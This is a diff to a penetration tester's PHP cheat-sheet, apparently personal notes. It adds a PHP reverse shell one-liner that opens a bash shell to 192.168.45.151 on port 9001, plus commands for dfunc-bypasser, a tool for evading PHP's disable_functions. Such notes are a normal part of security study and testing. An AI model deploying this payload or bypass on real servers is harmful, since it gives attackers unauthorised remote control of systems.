@@ -2,7 +2,14 @@
 
 All things PHP
 
-## Techniques
+```php
+# Reverse shell payload
+<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.151/9001 0>&1'\");?>
+```
+
+## Capabilities
+
+### dfunc-bypasser
 
 If access to phpinfo, but command execution not working, check `disable_functions`, and run the file/url against [dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser)
 
@@ -13,8 +20,6 @@ python2 dfunc-bypasser/dfunc-bypasser.py --file phpinfo.ph
 # Check a phpinfo url
 python2 dfunc-bypasser/dfunc-bypasser.py --url http://localhost/phpinfo.php
 ```
-
-### Emulation
 
 ### Web Server
 
@@ -117,14 +122,4 @@ Now you can run the website with the following command:
 
 ```bash
 php -S localhost:8000
-```
-
-### Miscellaneous
-
-See useful debug information by creating the file `debug.php` and adding the code:
-
-```php
-<?php
-phpinfo();
-?>
 ```
